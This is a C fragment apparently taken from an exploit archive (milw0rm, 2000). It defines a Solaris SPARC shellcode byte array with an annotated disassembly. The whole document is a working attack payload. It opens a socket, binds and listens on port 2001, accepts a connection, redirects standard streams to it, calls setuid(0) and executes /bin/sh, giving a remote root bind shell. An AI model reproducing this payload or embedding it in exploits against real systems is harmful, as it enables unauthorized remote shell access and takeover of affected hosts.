/*

  Solaris - Sparc -> www.dopesquad.net

*/

char shellcode[] =
  "\xa0\x23\xa0\x10"	/* sub    	%sp, 16, %l0 */
  "\xae\x23\x80\x10"	/* sub    	%sp, %l0, %l7 */
  "\xee\x23\xbf\xec"	/* st     	%l7, [%sp - 20] */
  "\x82\x05\xe0\xd6"	/* add    	%l7, 214, %g1 */
  "\x90\x25\xe0\x0e"	/* sub    	%l7, 14, %o0 */
  "\x92\x25\xe0\x0e"	/* sub    	%l7, 14, %o1 */
  "\x94\x1c\x40\x11"	/* xor    	%l1, %l1, %o2 */
  "\x96\x1c\x40\x11"	/* xor    	%l1, %l1, %o3 */
  "\x98\x25\xe0\x0f"	/* sub    	%l7, 15, %o4 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\xa4\x1a\x80\x08"	/* xor    	%o2, %o0, %l2 */
  "\xd2\x33\xbf\xf0"	/* sth    	%o1, [%sp - 16] */
  "\xac\x10\x27\xd1"	/* mov    	2001, %l6 */
  "\xec\x33\xbf\xf2"	/* sth    	%l6, [%sp - 14] */
  "\xc0\x23\xbf\xf4"	/* st     	%g0, [%sp - 12] */
  "\x82\x05\xe0\xd8"	/* add    	%l7, 216, %g1 */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0 */
  "\x92\x1a\xc0\x10"	/* xor    	%o3, %l0, %o1 */
  "\x94\x1a\xc0\x17"	/* xor    	%o3, %l7, %o2 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x82\x05\xe0\xd9"	/* add    	%l7, 217, %g1 */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0 */
  "\x92\x25\xe0\x0b"	/* sub    	%l7, 11, %o1 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x82\x05\xe0\xda"	/* add    	%l7, 218, %g1 */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0 */
  "\x92\x1a\xc0\x10"	/* xor    	%o3, %l0, %o1 */
  "\x94\x23\xa0\x14"	/* sub    	%sp, 20, %o2 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\xa6\x1a\xc0\x08"	/* xor    	%o3, %o0, %l3 */
  "\x82\x05\xe0\x2e"	/* add    	%l7, 46, %g1 */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0 */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1 */
  "\x94\x1b\x80\x0e"	/* xor    	%sp, %sp, %o2 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0 */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1 */
  "\x94\x02\xe0\x01"	/* add    	%o3, 1, %o2 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0 */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1 */
  "\x94\x02\xe0\x02"	/* add    	%o3, 2, %o2 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0 */
  "\x82\x02\xe0\x17"	/* add    	%o3, 23, %g1 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x21\x0b\xd8\x9a"	/* sethi  	%hi(0x2f626800), %l0 */
  "\xa0\x14\x21\x6e"	/* or     	%l0, 0x16e, %l0	! 0x2f62696e */
  "\x23\x0b\xdc\xda"	/* sethi  	%hi(0x2f736800), %l1 */
  "\x90\x23\xa0\x10"	/* sub    	%sp, 16, %o0 */
  "\x92\x23\xa0\x08"	/* sub    	%sp, 8, %o1 */
  "\x94\x1b\x80\x0e"	/* xor    	%sp, %sp, %o2 */
  "\xe0\x3b\xbf\xf0"	/* std    	%l0, [%sp - 16] */
  "\xd0\x23\xbf\xf8"	/* st     	%o0, [%sp - 8] */
  "\xc0\x23\xbf\xfc"	/* st     	%g0, [%sp - 4] */
  "\x82\x02\xe0\x3b"	/* add    	%o3, 59, %g1 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
  "\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0 */
  "\x82\x02\xe0\x01"	/* add    	%o3, 1, %g1 */
  "\x91\xd0\x38\x08"	/* ta     	0x8 */
;



# milw0rm.com [2000-11-19]